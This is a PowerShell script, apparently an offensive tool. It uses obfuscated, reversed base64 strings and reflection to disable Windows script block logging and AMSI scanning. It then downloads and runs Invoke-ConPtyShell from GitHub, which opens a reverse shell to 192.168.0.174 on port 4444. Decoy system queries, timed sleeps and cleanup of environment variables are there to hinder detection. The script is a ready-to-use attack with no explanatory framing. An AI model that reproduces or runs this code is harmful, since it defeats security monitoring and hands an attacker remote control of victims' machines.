$env:dJn1NfTq = "=AwcAwGApBAdAUFAuAgbA8GApBAdAEGAtBwbAQHA1BQQA4CA0BgbAUGAtBQZAcGAhBgbAEGANBgLA0GAlBAdAMHA5BwU"
$env:CCXyZ0gV = "==AAlBQdAwGAhBgVAQHAlBwR"
$env:QqDe8R01 = "==AAkBQZAwGApBQYAYEA0BQaA4GAJBQaAMHAtBQY"
$env:eOlxRA79 = "==AAkBAbAUGApBgRAQHAlBwR"
$env:DAqIpfIV = "=AwcAcGAuBQaAQHA0BQZAMFA5BwYAkGAsBwbAAFAwBQdA8GAyBwRAQGAlBAaAMGAhBwY"
$env:JHYbDlvF = "==AAzBAbAkGA0BQVAkGAzBQbAEEAuAgbA8GApBAdAEGAtBwbAQHA1BQQA4CA0BgbAUGAtBQZAcGAhBgbAEGANBgLA0GAlBAdAMHA5BwU"
$env:Aqv027DF = "=AQZAAHA5BAVAQHAlBwR"
$env:JOWen6Iq = "AcGAuBQaAcGAnBwbAwEArBwYA8GAsBgQAQHAwBQaAIHAjBwUAwFAsBAbAUGAoBwUAIHAlBwdA8GAQBAXAMHA3BwbAQGAuBQaAcFAcBAdAYGAvBwcA8GAyBwYAkGANBAXAMHAlBQaAMGApBAbA8GAQBAXAUEASBQQAcFAUBgRA8EATBAXAUEAOBQSAgEADBQQA0EAfBATAEEADBwTAwEAfBQWAUEALBAS"
$env:B7jEiGxg = "==AAlBQdAwGAhBgVAQHAlBwU"
$env:Vwd8HbnM = "AcGAuBQaAcGAnBwbAwEArBwYA8GAsBgQAQHAwBQaAIHAjBwUAUGAsBgYAEGAuBQR"

function fWhjk($n){$s=[Environment]::GetEnvironmentVariable($n);$c=$s.ToCharArray();[Array]::Reverse($c);$s=-join $c;$b=[Convert]::FromBase64String($s);[Text.Encoding]::Unicode.GetString($b)}

$wyz = fWhjk 'Aqv027DF'
$y3z = fWhjk 'eOlxRA79'
$vno = fWhjk 'B7jEiGxg'
$s9o = fWhjk 'CCXyZ0gV'
$oue = [System.Reflection.BindingFlags]((0x2E -bxor 0x0E) + (0x18 -bxor 0x10))

$uld = [PSObject].Assembly

try {
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName -ErrorAction SilentlyContinue
  $null = Test-Path "$env:SystemRoot\System32\kernel32.dll"
  Start-Sleep -Milliseconds 192

  try {
    $t66 = fWhjk 'dJn1NfTq'
    $scr = $uld.$wyz($t66)
    $lko = fWhjk 'DAqIpfIV'
    $bqz = fWhjk 'JOWen6Iq'
    $rrt = $scr.$y3z($lko, $oue)
    $oas = fWhjk 'Vwd8HbnM'
    $dk0 = $rrt.$s9o($null)
    if ($dk0 -eq $null) {
      $dk0 = @{}
      $rrt.$vno($null, $dk0)
    }
    $nvj = New-Object "System.Collections.Generic.Dictionary[string,object]"
    $nvj.Add($oas, 0)
    $dk0[$bqz] = $nvj
    $gdd = $rrt.$s9o($null)
    if ($gdd -ne $null -and $gdd.ContainsKey($bqz) -and $gdd[$bqz][$oas] -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  Start-Sleep -Milliseconds 89
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue

  try {
    $ayw = fWhjk 'JHYbDlvF'
    $zj9 = $uld.$wyz($ayw)
    $rch = fWhjk 'QqDe8R01'
    $rei = [System.DateTime]::Now.Ticks
    $mye = $zj9.$y3z($rch, $oue)
    $mye.$vno($null, $true)
    $m42 = $mye.$s9o($null)
    if ($m42 -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

try {
    $pzv = fWhjk 'JHYbDlvF'
    $fi4 = $uld.$wyz($pzv)
    if ($fi4 -ne $null) {
        Write-Host '[+] Bypass confirmed'

        # Download and execute ConPtyShell
        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); 
        Invoke-ConPtyShell 192.168.0.174 4444
    } else {
        Write-Host '[!] Bypass failed'
    }
} catch {
    Write-Host '[!] Bypass failed'
}

  Start-Sleep -Milliseconds 103
  $null = [Environment]::ProcessorCount
  $null = [System.Diagnostics.Process]::GetCurrentProcess().Id
}
finally {
  Remove-Item Env:\Aqv027DF -ErrorAction SilentlyContinue
  Remove-Item Env:\eOlxRA79 -ErrorAction SilentlyContinue
  Remove-Item Env:\B7jEiGxg -ErrorAction SilentlyContinue
  Remove-Item Env:\CCXyZ0gV -ErrorAction SilentlyContinue
  Remove-Item Env:\JHYbDlvF -ErrorAction SilentlyContinue
  Remove-Item Env:\QqDe8R01 -ErrorAction SilentlyContinue
  Remove-Item Env:\dJn1NfTq -ErrorAction SilentlyContinue
  Remove-Item Env:\DAqIpfIV -ErrorAction SilentlyContinue
  Remove-Item Env:\JOWen6Iq -ErrorAction SilentlyContinue
  Remove-Item Env:\Vwd8HbnM -ErrorAction SilentlyContinue
}

